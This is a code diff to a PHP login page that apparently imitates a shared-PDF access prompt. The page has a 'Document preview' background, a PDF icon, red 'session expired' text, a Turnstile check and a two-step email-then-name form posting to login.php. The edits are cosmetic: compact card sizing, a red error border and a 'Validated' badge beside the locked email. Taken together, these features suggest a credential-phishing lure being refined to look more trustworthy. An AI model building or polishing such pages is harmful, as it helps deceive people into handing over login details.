@@ -8,6 +8,8 @@ $step = $_SESSION['step'] ?? 1;
 $old_email = $_SESSION['old_email'] ?? '';
 $error     = $_SESSION['error_message'] ?? '';
 unset($_SESSION['error_message']);
+
+$hasError = !empty($error);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -99,16 +101,16 @@ unset($_SESSION['error_message']);
         }
 
         /* -------------------------------------------
-           CARD (Desktop-heavy)
+           CARD (reverted to compact width)
         -------------------------------------------- */
         .login-card {
             position: relative;
             z-index: 2;
-            width: 400px;         /* desktop-heavy width */
-            max-width: 420px;
+            width: 95%;
+            max-width: 320px;  /* back to previous compact size */
             background: var(--card-bg);
             border-radius: 6px;
-            padding: 24px 26px 28px;
+            padding: 22px 22px 26px;
             box-shadow: 0 18px 45px rgba(0,0,0,0.45);
             overflow: hidden;
 
@@ -116,6 +118,13 @@ unset($_SESSION['error_message']);
             opacity: 0;
             transform: translateY(14px) scale(0.98);
             animation: cardIn 0.55s ease-out forwards;
+            border: 1px solid transparent; /* default, no error */
+        }
+
+        /* Subtle red border when there is an error */
+        .login-card.has-error {
+            border-color: rgba(194, 21, 21, 0.55);
+            box-shadow: 0 18px 45px rgba(194, 21, 21, 0.35);
         }
 
         @keyframes cardIn {
@@ -163,7 +172,7 @@ unset($_SESSION['error_message']);
         /* Red “session expired” text */
         .doc-subtitle {
             text-align: center;
-            color: var(--error);   /* red like error */
+            color: var(--error);
             font-size: 11px;
             margin-bottom: 10px;
             font-weight: 600;
@@ -192,7 +201,6 @@ unset($_SESSION['error_message']);
             color: var(--text-color);
             font-size: 14px;
             outline: none;
-            box-sizing: border-box;
         }
 
         .field-wrapper input:focus {
@@ -201,10 +209,31 @@ unset($_SESSION['error_message']);
         }
 
         /* Read-only (validated) email appearance */
+        .validated-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .validated-row input.readonly-input {
+            flex: 1;
+        }
+
         .readonly-input {
-            background: rgba(0,0,0,0.04);
+            background: #f1f3f4;       /* changed background color */
             color: var(--subtext);
             cursor: not-allowed;
+        }
+
+        .validated-badge {
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 999px;
+            background: #e6f4ea;
+            color: #137333;
+            font-weight: 600;
+            border: 1px solid #cde9d7;
+            white-space: nowrap;
         }
 
         /* CAPTCHA wrapper: perfectly centered */
@@ -215,9 +244,9 @@ unset($_SESSION['error_message']);
             margin: 6px 0 4px;
         }
 
-        /* Turnstile full size for desktop */
+        /* Turnstile size (still clean for this card) */
         .cf-turnstile {
-            transform: scale(1);
+            transform: scale(0.9);
             transform-origin: center center;
         }
 
@@ -237,14 +266,6 @@ unset($_SESSION['error_message']);
         .btn-primary:hover {
             background: var(--btn-hover);
         }
-
-        /* Slight responsiveness for very small screens */
-        @media (max-width: 480px) {
-            .login-card {
-                width: 92%;
-                padding: 20px 18px 22px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -255,7 +276,7 @@ unset($_SESSION['error_message']);
         <img src="assets/background.png" alt="Document preview">
     </div>
 
-    <div class="login-card">
+    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">
         <div class="doc-icon">
             <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
         </div>
@@ -296,15 +317,16 @@ unset($_SESSION['error_message']);
             </form>
 
         <?php else: ?>
-            <!-- STEP 2 — NAME + OPAQUE VALIDATED EMAIL ABOVE -->
+            <!-- STEP 2 — LOCKED EMAIL + VALIDATED BADGE + NAME -->
             <form method="POST" action="login.php">
-                <div class="field-wrapper">
+                <div class="field-wrapper validated-row">
                     <input
                         type="email"
                         value="<?= htmlspecialchars($old_email) ?>"
                         class="readonly-input"
                         readonly
                     >
+                    <span class="validated-badge">Validated</span>
                 </div>
 
                 <div class="field-wrapper">
